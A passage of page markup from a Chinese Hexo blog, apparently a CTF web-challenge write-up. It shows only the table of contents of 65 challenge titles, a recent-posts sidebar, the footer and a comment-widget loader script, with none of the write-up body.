href="#5-%E6%BB%91%E7%A8%BD"><span class="toc-number">5.</span> <span class="toc-text">5.滑稽</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">6.</span> <span class="toc-text">6.计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-GET"><span class="toc-number">7.</span> <span class="toc-text">7.GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-POST"><span class="toc-number">8.</span> <span class="toc-text">8.POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E7%9F%9B%E7%9B%BE"><span class="toc-number">9.</span> <span class="toc-text">9.矛盾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-alert"><span class="toc-number">10.</span> <span class="toc-text">10.alert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5"><span class="toc-number">11.</span> <span class="toc-text">11.你必须让他停下来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">12.</span> <span class="toc-text">12.网站被黑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86"><span class="toc-number">13.</span> <span class="toc-text">13.社工-进阶收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-Flask-FileUpload"><span class="toc-number">14.</span> <span class="toc-text">14.Flask_FileUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-1%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B"><span class="toc-number">15.</span> <span class="toc-text">15.1和0的故事</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-easy-nbt"><span class="toc-number">16.</span> <span class="toc-text">16.easy_nbt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">17.</span> <span class="toc-text">17.留言板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-number">18.</span> <span class="toc-text">18.抄错的字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E7%AE%80%E5%8D%95%E5%8F%96%E8%AF%811"><span class="toc-number">19.</span> <span class="toc-text">19.简单取证1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-%E9%9A%90%E5%86%99"><span class="toc-number">20.</span> <span class="toc-text">20.隐写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-telnet"><span class="toc-number">21.</span> <span class="toc-text">21.telnet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E7%9C%BC%E8%A7%81%E9%9D%9E%E5%AE%9E"><span class="toc-number">22.</span> <span class="toc-text">22.眼见非实</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E5%95%8A%E5%93%92"><span class="toc-number">23.</span> <span class="toc-text">23.啊哒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-eval"><span class="toc-number">24.</span> <span class="toc-text">24.eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="toc-number">25.</span> <span class="toc-text">25.头等舱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">26.</span> <span class="toc-text">26.本地管理员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-bp"><span class="toc-number">27.</span> <span class="toc-text">27.bp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86"><span class="toc-number">28.</span> <span class="toc-text">28.社工-初步收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0"><span class="toc-number">29.</span> <span class="toc-text">29.社工-伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-game1"><span class="toc-number">30.</span> <span class="toc-text">30.game1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E5%8F%98%E9%87%8F1"><span class="toc-number">31.</span> <span class="toc-text">31.变量1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-source"><span class="toc-number">32.</span> <span class="toc-text">32.source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">33.</span> <span class="toc-text">33.源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">34.</span> <span class="toc-text">34.文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81"><span class="toc-number">35.</span> <span class="toc-text">35.好像需要密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="toc-number">36.</span> <span class="toc-text">36.备份是个好习惯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-No-one-knows-regex-better-than-me"><span class="toc-number">37.</span> <span class="toc-text">37.No one knows regex better than me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38-cookies"><span class="toc-number">38.</span> <span class="toc-text">38.cookies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#39-never-give-up"><span class="toc-number">39.</span> <span class="toc-text">39.never_give_up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#40-shell"><span class="toc-number">40.</span> <span class="toc-text">40.shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#41-ez-java-serialize"><span class="toc-number">41.</span> <span class="toc-text">41.ez_java_serialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">42.</span> <span class="toc-text">42.成绩查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E"><span class="toc-number">43.</span> <span class="toc-text">43.秋名山车神</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">44.</span> <span class="toc-text">44.速度要快</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E8%81%AA%E6%98%8E%E7%9A%84php"><span class="toc-number">45.</span> <span class="toc-text">45.聪明的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="toc-number">46.</span> <span class="toc-text">46.xxx二手交易市场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD"><span class="toc-number">47.</span> <span class="toc-text">47.闪电十六鞭</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99"><span class="toc-number">48.</span> <span class="toc-text">48.字符？正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-%E5%89%8D%E5%A5%B3%E5%8F%8B"><span class="toc-number">49.</span> <span class="toc-text">49.前女友</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#50-login1"><span class="toc-number">50.</span> <span class="toc-text">50.login1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">51.</span> <span class="toc-text">51.你从哪里来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-MD5"><span class="toc-number">52.</span> <span class="toc-text">52.MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="toc-number">53.</span> <span class="toc-text">53.程序员本地网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%93%A6"><span class="toc-number">54.</span> <span class="toc-text">54.各种绕过哦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#55-file-get-contents"><span class="toc-number">55.</span> <span class="toc-text">55.file_get_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#56-%E5%AE%89%E6%85%B0%E5%A5%96"><span class="toc-number">56.</span> <span class="toc-text">56.安慰奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#57-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">57.</span> <span class="toc-text">57.文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#58-decrypt"><span class="toc-number">58.</span> <span class="toc-text">58.decrypt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#59-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="toc-number">59.</span> <span class="toc-text">59.文件包含2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#60-%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">60.</span> <span class="toc-text">60.需要管理员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#61-newphp"><span class="toc-number">61.</span> <span class="toc-text">61.newphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#62-%E7%82%B9login%E5%92%8B%E6%B2%A1%E5%8F%8D%E5%BA%94"><span class="toc-number">62.</span> <span class="toc-text">62.点login咋没反应</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="toc-number">63.</span> <span class="toc-text">63.都过滤了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-login2"><span class="toc-number">64.</span> <span class="toc-text">64.login2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#65-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">65.</span> <span class="toc-text">65.sql注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/python/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/" title="软件测试"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127008797.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="软件测试"/></a><div class="content"><a class="title" href="/python/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/" title="软件测试">软件测试</a><time datetime="2023-02-24T07:11:00.714Z" title="发表于 2023-02-24 15:11:00">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/crypto/crypto/" title="crypto"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/b86a37974bed46521a0ed754bb72e45a.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="crypto"/></a><div class="content"><a class="title" href="/crypto/crypto/" title="crypto">crypto</a><time datetime="2023-02-24T07:10:51.443Z" title="发表于 2023-02-24 15:10:51">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" title="域名解析"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/bd1d78eb10e9f0020b63be426cb0920b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域名解析"/></a><div class="content"><a class="title" href="/Web/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" title="域名解析">域名解析</a><time datetime="2023-02-24T06:22:42.336Z" title="发表于 2023-02-24 14:22:42">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/" title="逻辑越权"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逻辑越权"/></a><div class="content"><a class="title" href="/Web/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/" title="逻辑越权">逻辑越权</a><time datetime="2023-02-24T06:19:01.558Z" title="发表于 2023-02-24 14:19:01">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/" title="版本控制"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="版本控制"/></a><div class="content"><a class="title" href="/Web/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/" title="版本控制">版本控制</a><time datetime="2023-02-24T06:19:01.546Z" title="发表于 2023-02-24 14:19:01">2023-02-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By jiutu2003</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pmfnQAIlGrKZuL3XuDvicCUP-gzGzoHsz',
      appKey: '88cFnty7M7cl67dTJrrrLyPB',
      avatar: 'monsterid',
      serverURLs: 'https://pmfnqail.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>